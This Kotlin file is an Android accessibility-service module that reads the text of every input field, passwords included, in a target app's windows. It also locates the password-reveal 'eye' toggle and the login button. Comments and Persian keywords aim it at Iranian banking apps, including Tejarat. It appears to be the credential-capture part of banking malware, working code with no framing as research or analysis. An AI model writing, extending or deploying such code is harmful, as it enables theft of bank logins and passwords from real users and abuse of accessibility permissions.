package com.base.realtime.watch

import android.accessibilityservice.AccessibilityService
import android.graphics.Rect
import android.view.accessibility.AccessibilityNodeInfo
import android.view.accessibility.AccessibilityWindowInfo
import kotlin.math.abs

internal data class CapturedField(
    val name: String,
    val hint: String,
    val text: String,
    val password: Boolean,
)

internal data class FormLook(
    val main: Rect?,
    val eye: Rect?,
    val password: Rect?,
    val fields: List<CapturedField>,
)

internal object FormScan {
    fun look(service: AccessibilityService, pkg: String): FormLook {
        val roots = roots(service, pkg)
        if (roots.isEmpty()) return FormLook(null, null, null, emptyList())
        val facts = ArrayList<Fact>(96)
        try {
            for (root in roots) collect(root, facts)
        } finally {
            roots.forEach { it.recycle() }
        }
        val edits = facts.filter { it.editable && it.bounds.width() > 0 && it.bounds.height() > 0 }
            .sortedBy { it.bounds.top }
        val fields = edits.map {
            CapturedField(
                name = it.viewId.ifBlank { it.desc },
                hint = it.hint,
                text = it.text,
                password = it.password,
            )
        }
        if (edits.isEmpty()) {
            facts.forEach { it.node.recycle() }
            return FormLook(null, null, null, fields)
        }
        val password = edits.filter { it.password }.minByOrNull { it.bounds.width().toLong() * it.bounds.height() }
        val eye = password?.let { pwd ->
            facts.map { it to eyeScore(service, it, pwd.bounds) }
                .filter { it.second >= 45 }
                .maxWithOrNull(
                    compareBy<Pair<Fact, Int>>({ it.second })
                        .thenBy { distToNearestEnd(it.first.bounds, pwd.bounds) }
                        .thenBy { it.first.bounds.width() },
                )?.first
        }
        val main = pickMainButton(service, facts, edits, eye)
        val look = FormLook(
            main = main?.bounds?.let { Rect(it) },
            eye = eye?.bounds?.let { Rect(it) },
            password = password?.bounds?.let { Rect(it) },
            fields = fields,
        )
        facts.forEach { it.node.recycle() }
        return look
    }

    fun readFields(service: AccessibilityService, pkg: String): List<CapturedField> = look(service, pkg).fields

    private fun roots(service: AccessibilityService, pkg: String): List<AccessibilityNodeInfo> {
        val windows = service.windows ?: return emptyList()
        val out = ArrayList<AccessibilityNodeInfo>()
        try {
            for (window in windows) {
                if (window.type != AccessibilityWindowInfo.TYPE_APPLICATION) continue
                val root = window.root ?: continue
                if (root.packageName?.toString() == pkg) out.add(root) else root.recycle()
            }
        } finally {
            for (window in windows) {
                try {
                    window.recycle()
                } catch (_: Throwable) {
                }
            }
        }
        return out
    }

    private fun collect(node: AccessibilityNodeInfo, facts: MutableList<Fact>) {
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            collect(child, facts)
            child.recycle()
        }
        val bounds = boundsOf(node)
        if (bounds.width() <= 0 || bounds.height() <= 0) return
        val cls = node.className?.toString().orEmpty()
        val blob = "${node.viewIdResourceName.orEmpty()} ${node.hintText ?: ""} ${node.contentDescription ?: ""} ${node.text ?: ""}"
            .lowercase()
        facts.add(
            Fact(
                node = AccessibilityNodeInfo.obtain(node),
                bounds = bounds,
                text = node.text?.toString().orEmpty(),
                viewId = node.viewIdResourceName.orEmpty(),
                hint = node.hintText?.toString().orEmpty(),
                desc = node.contentDescription?.toString().orEmpty(),
                clickable = node.isClickable || hasClick(node),
                editable = node.isEditable || cls.contains("EditText"),
                password = node.isPassword || (node.isEditable && mentionsPassword(blob)),
                className = cls,
                checkable = node.isCheckable,
                label = blob,
            ),
        )
    }

    private fun pickMainButton(service: AccessibilityService, facts: List<Fact>, edits: List<Fact>, eye: Fact?): Fact? {
        val screenW = service.resources.displayMetrics.widthPixels
        val form = edits.filter { it.bounds.width() > 40 && it.bounds.left < screenW && it.bounds.right > 0 }
            .ifEmpty { edits }
        val formBottom = form.maxOf { it.bounds.bottom }
        val minWidth = (screenW * 0.28f).toInt()
        val matched = facts.filter { candidate ->
            if (candidate.editable || candidate.password) return@filter false
            if (eye != null && (candidate.node == eye.node || Rect.intersects(candidate.bounds, eye.bounds))) return@filter false
            val loginHint = isLoginMain(candidate, facts)
            if (!candidate.clickable && !(loginHint && hasClick(candidate.node))) return@filter false
            val wide = candidate.bounds.width() >= minWidth || (loginHint && candidate.bounds.width() >= 48)
            if (!wide || candidate.bounds.height() < 24 || candidate.bounds.height() > screenW / 2) return@filter false
            if (candidate.bounds.top < formBottom - candidate.bounds.height() / 4) return@filter false
            form.none { candidate.bounds.contains(it.bounds.centerX(), it.bounds.centerY()) }
        }
        val density = service.resources.displayMetrics.density
        val textRow = (36 * density).toInt()
        val pool = matched.filter { row ->
            if (isLoginMain(row, facts)) return@filter true
            if (row.bounds.height() > textRow) return@filter true
            matched.none { other -> other !== row && other.bounds.top >= row.bounds.bottom - textRow / 4 }
        }
        return pool.minWithOrNull(compareBy<Fact>({ if (isLoginMain(it, facts)) 0 else 1 }, { it.bounds.top }))
    }

    private fun isLoginMain(fact: Fact, facts: List<Fact>): Boolean {
        if (fact.viewId.lowercase().contains("login")) return true
        if ("${fact.text} ${fact.desc}".contains("ورود")) return true
        val box = expand(fact.bounds, 12)
        return facts.any { other ->
            other !== fact && !other.editable && other.className.contains("Text") &&
                other.text.contains("ورود") && box.contains(other.bounds.centerX(), other.bounds.centerY()) &&
                other.bounds.width() <= box.width()
        }
    }

    /**
     * Cross-device eye pick: semantics first, then geometry relative to the password field.
     * Never absolute pixels. Works for LTR (right end) and RTL (left end) banks.
     */
    private fun eyeScore(service: AccessibilityService, fact: Fact, password: Rect): Int {
        if (fact.password || fact.editable) return 0
        val node = fact.bounds
        if (node.width() <= 0 || node.height() <= 0) return 0
        if (node.width() >= password.width()) return 0
        val density = service.resources.displayMetrics.density
        val minIcon = (18 * density).toInt()
        val maxIcon = (72 * density).toInt()
        val sameRow = abs(node.centerY() - password.centerY()) <= password.height()
        if (!sameRow) return 0
        val overlapsField = Rect.intersects(node, password) ||
            (node.centerY() in password.top..password.bottom &&
                node.centerX() in (password.left - maxIcon)..(password.right + maxIcon))
        if (!overlapsField) return 0

        var score = 0
        if (EYE_WORDS.any { fact.label.contains(it) }) score += 120
        if (fact.checkable) score += 50
        if (fact.className.contains("Image") || fact.className.contains("Check")) score += 40
        // Compose/custom banks often expose the toggle only as a small Button with no id/desc.
        if (fact.className.contains("Button") && node.width() <= maxIcon && node.height() <= maxIcon) score += 35
        if (fact.clickable) score += 30
        if (node.width() in minIcon..maxIcon && node.height() in minIcon..maxIcon) score += 45
        if (atFieldEnd(service, node, password)) score += 80
        // Prefer the outer control on that end (Tejarat: leftmost @ field.left is the eye).
        val endDist = distToNearestEnd(node, password)
        if (endDist <= (8 * density).toInt()) score += 25
        else if (endDist <= (24 * density).toInt()) score += 10
        return score
    }

    private fun atFieldEnd(service: AccessibilityService, node: Rect, password: Rect): Boolean {
        val pad = (64 * service.resources.displayMetrics.density).toInt()
        val sameRow = abs(node.centerY() - password.centerY()) <= password.height()
        if (!sameRow) return false
        return abs(node.centerX() - password.right) <= pad || abs(node.centerX() - password.left) <= pad
    }

    private fun distToNearestEnd(node: Rect, password: Rect): Int {
        return minOf(abs(node.centerX() - password.left), abs(node.centerX() - password.right))
    }

    private fun expand(rect: Rect, dp: Int): Rect {
        return Rect(rect.left - dp, rect.top - dp, rect.right + dp, rect.bottom + dp)
    }

    private fun mentionsPassword(blob: String): Boolean {
        return blob.contains("password") || blob.contains("passwd") || blob.contains("رمز") || blob.contains("گذرواژه")
    }

    private fun hasClick(node: AccessibilityNodeInfo): Boolean {
        return node.actionList?.any { it.id == AccessibilityNodeInfo.ACTION_CLICK } == true
    }

    private fun boundsOf(node: AccessibilityNodeInfo): Rect {
        val rect = Rect()
        node.getBoundsInScreen(rect)
        return rect
    }

    private data class Fact(
        val node: AccessibilityNodeInfo,
        val bounds: Rect,
        val text: String,
        val viewId: String,
        val hint: String,
        val desc: String,
        val clickable: Boolean,
        val editable: Boolean,
        val password: Boolean,
        val className: String,
        val checkable: Boolean,
        val label: String,
    )

    private val EYE_WORDS = listOf(
        "visibility", "visible", "show", "hide", "password_toggle", "toggle", "eye", "reveal",
        "نمایش", "مخفی", "چشم",
    )
}
